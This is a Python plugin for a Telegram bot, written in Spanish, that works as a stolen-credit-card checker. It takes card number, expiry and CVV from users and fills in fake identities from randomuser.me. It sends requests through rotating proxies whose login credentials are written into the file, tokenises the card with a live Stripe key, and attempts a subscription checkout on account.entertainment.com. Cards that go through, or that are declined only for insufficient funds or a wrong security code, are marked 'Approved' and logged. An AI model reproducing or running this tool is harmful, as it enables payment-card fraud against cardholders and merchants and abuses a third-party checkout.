import json
import requests
import time
import asyncio
import random
from luhn import verify
from faker import Faker
import plugins.defsrp
import plugins.sql.gates as gates

from asyncio import sleep
from pyrogram import Client, filters
from pyrogram.types import (
    Message,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
)
from pyrogram.types import Message
from pyrogram import Client, filters
from plugins.clases.usuarios import usuario
session = requests.session
from plugins.defsrp import ct
from SQLaccounts import run_query
from plugins.defs1 import buscarEnT
from urllib.parse import urlparse
fake = Faker()
def buscar(res, primer, final):
    try:
        inicio = res.index( primer ) + len( primer )
        fin = res.index( final, inicio )
        return res[inicio:fin]
    except ValueError:
        return None

proxys = {
    'https':'http://xvpdohon-rotate:j3hvas2j91cd@p.webshare.io:80/',
    'https':'http://bnvudhvm-rotate:jkgnyp9lecnr@p.webshare.io:80/',
    'https':'http://kpsldceh-rotate:58keli6fhazy@p.webshare.io:80/',
    'https':'http://urzeqtzv-rotate:f24yk1gwccta@p.webshare.io:80/',
    'https':'http://oiinvlnx-rotate:r2lx2vr4jbjo@p.webshare.io:80/',
    'https':'http://xvpdohon-rotate:j3hvas2j91cd@p.webshare.io:80/',
    'https':'http://bnvudhvm-rotate:jkgnyp9lecnr@p.webshare.io:80/',
    'https':'http://kpsldceh-rotate:58keli6fhazy@p.webshare.io:80/',
    'https':'http://urzeqtzv-rotate:f24yk1gwccta@p.webshare.io:80/',
    'https':'http://oiinvlnx-rotate:r2lx2vr4jbjo@p.webshare.io:80/',
    'https':'http://hftsdyhr-rotate:iziwp0qs6av1@p.webshare.io:80/'}
uniproxy = requests.Session()
GATE = "STRIPE AUTH [ST ]"
uniproxy.proxies = uniproxy


@Client.on_message(filters.command(["st"], prefixes=["/", "."]))
async def br(_, m: Message):
    Status = gates.buscarT("st")
    try:
        Estado = Status[2]
    except Exception: return await m.reply('<b>Error al encontrar el Gate</b>')
    if Estado == 'off': return await m.reply(f'𝑬𝒔𝒕𝒆 𝒄𝒐𝒎𝒂𝒏𝒅𝒐 𝒆𝒔𝒕𝒂 𝒅𝒆𝒔𝒂𝒄𝒕𝒊𝒗𝒂𝒅𝒐 𝒕𝒆𝒎𝒑𝒐𝒓𝒂𝒍𝒎𝒆𝒏𝒕𝒆\n𝑹𝒂𝒛𝒐́𝒏: <i>{Status[3]}</i>')
    user = m.from_user.username
    id = m.from_user.id
    user = usuario(nombre=user, id=id)
    rango = user.buscar()
    if not rango or rango == False: return await m.reply('<b>Usuario no registrado porfavor registrese</b>')
    if rango[2] == "Free":
        return await m.reply("<b>Necesita ser premium para utilizar este comando</b>")
    rangoC = rango[5]
    if rangoC == None:
        rangoC = rango[2]
    infake = Faker()
    ccs = m.text[len("/st "):]
    if not ccs:
        return await m.reply("""<b>
𝑭𝒐𝒓𝒎𝒂𝒕𝒐 𝑪𝑪:
𝑪𝑪|𝑴𝑬𝑺|𝑨𝑵̃𝑶|𝑪𝑽𝑽
        </b>""")

    ccs = ccs.replace("/", "|")
    spli = ccs.split("|")
    cc = spli[0]
    mes = spli[1]
    ano = spli[2]
    cvv = spli[3]



    if len(str(cc))<16 or len(str(cc))>16:
        return await m.reply("""<b>
𝑭𝒐𝒓𝒎𝒂𝒕𝒐 𝑪𝑪:
𝑪𝑪|𝑴𝑬𝑺|𝑨𝑵̃𝑶|𝑪𝑽𝑽
        </b>""")
    
    veri = verify(cc)
    if veri == False:
            return m.reply("Luhn Invalido ❌")
    if veri == True:

        time1 = time.perf_counter()
        inicio = await m.reply("Iniciando Chequeo de CC ⏳") #Inicio de chequeo

        apiinfo = requests.get(f"https://randomuser.me/api/?nat=US").json()
        nombre = apiinfo["results"][0]["name"]["first"]
        apellido = apiinfo["results"][0]["name"]["last"]
        email = apiinfo["results"][0]["email"]
        Calle = apiinfo["results"][0]["location"]["street"]["number"]
        ciudad = apiinfo["results"][0]["location"]["city"]
        estado = apiinfo["results"][0]["location"]["state"]
        zipcode = apiinfo["results"][0]["location"]["postcode"]
        celularS = apiinfo["results"][0]["cell"]

        celularS = celularS.replace("(", "")
        celularS = celularS.replace(")", "")
        celularS = celularS.replace(" ", "")
        celular = celularS.replace("-", "")

        #await inicio.edit(f"""
    #nombre: {nombre}
    #apellido: {apellido}
    #email: {email}
    #calle: {Calle}
    #ciudad: {ciudad}
    #estado: {estado}
    #zipcode: {zipcode}
    #celular: {celular}
    #""")

        headers1 = {
        'Host': 'api.stripe.com',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0',
        'Accept': 'application/json',
        'Accept-Language': 'es-MX,es;q=0.8,en-US;q=0.5,en;q=0.3',
        'Accept-Encoding': 'gzip, deflate, br',
        'Referer': 'https://js.stripe.com/',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': '471',
        'Origin': 'https://js.stripe.com',
        'DNT': '1',
        'Connection': 'keep-alive',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site'
        }

        soli1 = "JTdCJTIydjIlMjIlM0ExJTJDJTIyaWQlMjIlM0ElMjJkMDRmOWQ4YjRkMzZlMDc5MjI5YzRkZjBiYzQ5OTU5NCUyMiUyQyUyMnQlMjIlM0E5JTJDJTIydGFnJTIyJTNBJTIyNC41LjQyJTIyJTJDJTIyc3JjJTIyJTNBJTIyanMlMjIlMkMlMjJhJTIyJTNBbnVsbCUyQyUyMmIlMjIlM0ElN0IlMjJhJTIyJTNBJTIyaHR0cHMlM0ElMkYlMkZyTDVsX0h2Z2lzbm9MaXdOZ0JNUElkQ0pDa2ZLV0NZT1MwLTNxSVJjcU9RLlZBeFliYWpCTHJtR3VWU1RiQklTRTVXRk11M2ZHeFhRYmk1Smtfa1ZqdU0uZzJ1OS1ocVp2R0lxWUpjUGxQZndKQWYtdjNSZ3lLX3gxTnBwekFsQTEyTSUyRkhTb0l5R3FHb2lGa1Z6QXJ5RFBtOE9ySzVYS0F1YllIRlI1RWVmeGg2UmMlM0Y1cnF4THkweUY1MjR1cmdJY2JzX2pPRTZ3eW9wYnhYTF9yc3Rkc2FZZFprJTNEWFp5cXJ0ajhoMGJrb1hQTXRBbjA1OXQ0M2xaWFFHSDV4cWYyaEdPVi1QSSUyNjEzNUgyZ2pKdjZ6X3RxNXpKeUNQTlhwc3JRSksyQWFGSlFCNUR3cDRNN2slM0R5bGVmWG9fQi1jcHB4TGI3Z2J4V0IwSXFkR2NPazBua2w3OUlKak5aemc4JTI2NHJZa3cxQkx4X2o4blphcE9EQ2hlcUFfSUctanJKRlhtZVBLbVJ2ZDhZayUzRFBNd2JMZVlKT3hMVjM3bk9CZ1JkbGEwSmdiQ3YwMXg4SUdHMVNHNFhJZ0UlMjIlMkMlMjJiJTIyJTNBJTIyaHR0cHMlM0ElMkYlMkZyTDVsX0h2Z2lzbm9MaXdOZ0JNUElkQ0pDa2ZLV0NZT1MwLTNxSVJjcU9RLlZBeFliYWpCTHJtR3VWU1RiQklTRTVXRk11M2ZHeFhRYmk1Smtfa1ZqdU0uZzJ1OS1ocVp2R0lxWUpjUGxQZndKQWYtdjNSZ3lLX3gxTnBwekFsQTEyTSUyRk9uRmowSXd0MTVhUk5BNnlqNC1QZ0F5YXVReWJSbEktM2Ezb011dFR2YTQlM0Y1cnF4THkweUY1MjR1cmdJY2JzX2pPRTZ3eW9wYnhYTF9yc3Rkc2FZZFprJTNEWFp5cXJ0ajhoMGJrb1hQTXRBbjA1OXQ0M2xaWFFHSDV4cWYyaEdPVi1QSSUyNjEzNUgyZ2pKdjZ6X3RxNXpKeUNQTlhwc3JRSksyQWFGSlFCNUR3cDRNN2slM0R5bGVmWG9fQi1jcHB4TGI3Z2J4V0IwSXFkR2NPazBua2w3OUlKak5aemc4JTIyJTJDJTIyYyUyMiUzQSUyMkJjRkZkVlRYQV9sWEtPNFluRmpSUGg2OWR4di14MUZ5V3g5UnNhcmNKQUElMjIlMkMlMjJkJTIyJTNBJTIyZDM5MmRhYmYtZTExZS00N2I3LThhMjQtNjBlNzAwYTg5ZWMxMjc1OTRhJTIyJTJDJTIyZSUyMiUzQSUyMmY3M2Y2YWJjLTZmMzctNDA4ZC05N2RmLTc3MDEzMmNhZTcwYzFmZmNkNiUyMiUyQyUyMmYlMjIlM0FmYWxzZSUyQyUyMmclMjIlM0F0cnVlJTJDJTIyaCUyMiUzQXRydWUlMkMlMjJpJTIyJTNBJTVCJTIybG9jYXRpb24lMjIlNUQlMkMlMjJqJTIyJTNBJTVCJTVEJTJDJTIybiUyMiUzQTE1NCUyQyUyMnUlMjIlM0ElMjJhY2NvdW50LmVudGVydGFpbm1lbnQuY29tJTIyJTJDJTIydiUyMiUzQSUyMmFjY291bnQuZW50ZXJ0YWlubWVudC5jb20lMjIlN0QlMkMlMjJoJTIyJTNBJTIyM2NkNTc5MTgzODNmZTkwMDlkYjglMjIlN0Q="
        

        requests1 = uniproxy.post("https://m.stripe.com/6", headers=headers1, data=soli1).json()
        guid = requests1["guid"]
        muid = requests1["muid"]
        sid = requests1["sid"]

        time2 = time.perf_counter()
        await inicio.edit(f"""<b>
Chequeando CC ⏳ | 25%
Tiempo: {time2 - time1:0.2} segundos
</b>""")

        #await inicio.edit(requests1)


        headers2 = {
    'Host': 'api.stripe.com',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0',
    'Accept': 'application/json',
    'Accept-Language': 'es-MX,es;q=0.8,en-US;q=0.5,en;q=0.3',
    'Accept-Encoding': 'gzip, deflate, br',
    'Referer': 'https://js.stripe.com/',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Content-Length': '393',
    'Origin': 'https://js.stripe.com',
    'Connection': 'keep-alive',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-site',
        }


        soli2 = {
        "card[name]": nombre+apellido,
        "card[number]": cc,
        "card[cvc]": cvv,
        "card[exp_month]": mes,
        "card[exp_year]": ano,
        "guid": guid,
        "muid": muid,
        "sid": sid,
        "payment_user_agent": "stripe.js/185ad2604;+stripe-js-v3/185ad2604",
        "time_on_page": "23327",
        "key": "pk_live_Ii63DwkODRhaVyFBQLU6UYXz",
        "pasted_fields": "number"
        }

        complete = f"{cc}|{mes}|{ano}|{cvv}"
#--------------------------------Bin info--------------------------------#
        BIN = m.text[len("/s2 "): 11]
            
        inputm = m.text.split(None, 1)[1]
        bincode = 6

        BIN = inputm[:bincode]

        gateBIN = requests.get(f"https://binlookup-1.andrexxone.repl.co/index.php?bin={BIN}").json()
    if gateBIN["status"] == True:
        status = "𝐕𝐚𝐥𝐢𝐝 𝐁𝐢𝐧"
        bin = gateBIN["query"]  
        brand = gateBIN["brand"]
        type = gateBIN["type"]
        level = gateBIN["level"]
        bank = gateBIN['bank']["name"];
        pais = gateBIN["country"]["ISO2"]
        country = gateBIN["country"]["name"]
        emojiCountry = gateBIN["country"]["flag"];
        currency = gateBIN["country"]["currency"]
        
        time3 = time.perf_counter()
        await inicio.edit(f"""<b>
Chequeando CC ⏳ | 35%
Tiempo: {time3 - time1:0.2} segundos
</b>""")

        
#--------------------------------Fin de Bin info--------------------------------#
        requests2 = uniproxy.post("https://api.stripe.com/v1/tokens", headers=headers2, data=soli2).json()
        requests2JSON = json.dumps(requests2)
        time4 = time.perf_counter()
        if "error" in requests2JSON:
            error_message = requests2["error"]["message"]
            return await inicio.edit(f"""<b>
CC: {complete}
Estado: Tarjeta rechazada ❌
response: {error_message}
------> Detalles bin <------
Bin: {bin}
Bin info: {brand} - {type} - {level}
Banco: {bank}
Pais: <code>{country} {emojiCountry}</code> - <code>{currency}</code>
------> Info <------
Tiempo: {time4 - time1:0.2} segundos
Chequeada por: @{m.from_user.username}
Owner: <code>Draxxd30</code>
</b>""")
        else:
            tokenID1 = requests2["id"]
            await inicio.edit(f"""<b>
Chequeando CC ⏳ | 50%
Tiempo: {time4 - time1:0.2} segundos        
</b>""")
            requests3 = uniproxy.post("https://api.stripe.com/v1/tokens", headers=headers2, data=soli2).json()
            requests3JSON = json.dumps(requests3)
            time5 = time.perf_counter()
            if "error" in requests3JSON:
                error_message2 = requests3["error"]["message"]
                return await inicio.edit(f"""<b>
CC: {complete}
Estado: Tarjeta rechazada ❌
response: {error_message}
------> Detalles bin <------
Bin: {bin}
Bin info: {brand} - {type} - {level}
Banco: {bank}
Pais: <code>{country} {emojiCountry}</code> - <code>{currency}</code>
------> Info <------
Tiempo: {time4 - time1:0.2} segundos
Chequeada por: @{m.from_user.username}
Owner: <code>Draxxd30</code>
</b>""")
            else:
                tokenID2 = requests3["id"]
                await inicio.edit(f"""<b>
Chequeando CC ⏳ | 75%
Tiempo: {time5 - time1:0.3} segundos        
</b>""")

                headers3 = {
                'Host': 'account.entertainment.com',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0',
                'Accept': '*/*',
                'Accept-Language': 'es-MX,es;q=0.8,en-US;q=0.5,en;q=0.3',
                'Accept-Encoding': 'gzip, deflate, br',
                'X-CSRF-Token': 'tYAy9R3WSKDbdkMMkfABDEmPUfw+jOCXH2VsqCJ1mubwjxCaNAazHrjLcUthbInE+3xV41Mxvo9jV+BjulrOYQ==',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'X-Requested-With': 'XMLHttpRequest',
                'Content-Length': '1795',
                'Origin': 'https://account.entertainment.com',
                'Connection': 'keep-alive',
                'Referer': 'https://account.entertainment.com/checkout-payment?myshopify_domain=shop.entertainment.com&cart_token=01509c9112e87163f0f961274615f1c5',
                'Cookie': "",
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'TE': 'trailers'
                }

                soli3 = {
                "variant_id": "",
                "email": email,
                "shipping_address[first_name]": nombre,
                "shipping_address[last_name]": apellido,
                "shipping_address[address1]": Calle,
                "shipping_address[address2]": "",
                "shipping_address[phone]": celular,
                "shipping_address[city]": ciudad,
                "shipping_address[province]": "NY",
                "shipping_address[country]": "US",
                "shipping_address[zip]": zipcode,
                "shipping_address[company]": "",
                "billing_address[first_name]": nombre,
                "billing_address[last_name]": apellido,
                "billing_address[address1]": Calle,
                "billing_address[address2]": "",
                "billing_address[phone]": celular,
                "billing_address[city]": ciudad,
                "billing_address[province]": "NY",
                "billing_address[country]": "US",
                "billing_address[zip]": zipcode,
                "billing_address[company]": "",
                "token_id": tokenID1,
                "token_id2": tokenID2,
                "stripe_token": tokenID1,
                "plan_code": "",
                "product_title": "",
                "product_description": "",
                "products": "[{\"title\":\"Entertainment+Digital\",\"description\":\"Annual+Membership+/+DA1F2499+/+1st+30-days+free,+then+$24.99+per+year\",\"price\":0,\"variant_id\":39383477715047,\"type\":\"Digital+Membership\",\"qty\":1,\"src\":\"https://cdn.shopify.com/s/files/1/0689/3239/products/DigitalPhone2021blue.jpg?v=1624463322\",\"requires_shipping\":false,\"renewal\":true,\"product_id\":417690975,\"plancode\":\"DA1F2499\",\"newMemberExclusive\":false,\"exclusionary\":false,\"affiliate\":\"\"}]",
                "shipping_title": "",
                "shipping_code": "",
                "shipping_price": "0",
                "shipping_id": "0",
                "accepts_marketing": "1",
                "discount_code": "",
                "discount_amount": "0",
                "discount_type": "",
                "unixTimeStamp": "1690862400",
                "appsflyer_id": "",
                "idfa": "",
                "advertising_id": "",
                "device_ip": "",
                "app_id": "",
                "bundleIdentifier": "",
                "dev_key": "",
                "source": ""
                }
                username = m.from_user.username
                id = m.from_user.id
                user = usuario(nombre=username, id=id)
                rango = user.buscarR()
                if rango == None:
                    return await m.reply(f"<b>El id {id} no esta registrado</b>")
                elif rango == False:
                    return await m.reply("<b>Error del sistema</b>")
                requests4 = uniproxy.post("https://account.entertainment.com/ajax/create_subscription", headers=headers3, data=soli3).json()
                response = requests4["message"]
                time6 = time.perf_counter()
                r_logo, r_mes, r_res = "❌", 'Declined', response
                if response == "create shopify order succeed": r_logo, r_mes, r_res = '✅', 'Approved', 'Approved'
                elif response == "Your card's security code is incorrect.": r_logo, r_mes, r_res = '✅', 'Approved', response
                elif response == "Your card has insufficient funds.": r_logo, r_mes, r_res = '✅', 'Approved', response
                texto = f'𝐂𝐚𝐫𝐝:\b<code>{complete}</code>\n𝐒𝐭𝐚𝐭𝐮𝐬: <i>{r_mes} {r_logo}</i>\n𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <i>{r_res}</i>\n𝐆𝐚𝐭𝐞: <i>Stripe Auth</i>\n<b>------> 𝐃𝐞𝐭𝐚𝐢𝐥𝐬 <------</b>\n𝐁𝐢𝐧: <code>{bin}</code>\n𝐁𝐢𝐧 𝐢𝐧𝐟𝐨: <code><i>{brand} - {type} - {level}</i></code>\n𝐁𝐚𝐧𝐤: <code><i>{bank}</i></code>\n𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country} {emojiCountry}</code> - <code>{currency}</code>\n<b>------> 𝐈𝐧𝐟𝐨 <------</b>\n𝐓𝐢𝐦𝐞: {time6 - time1:0.3} 𝐒𝐞𝐠𝐬\n𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐛𝐲:  <a href="tg://user?id={id}">{nombre}</a> [<b>{rangoC}</b>]\n𝐎𝐰𝐧𝐞𝐫: <code><i>Draxxd30</i></code>'
                if response == "create shopify order succeed": ct(complete, response, user=user, gate=GATE)
                await inicio.edit(texto)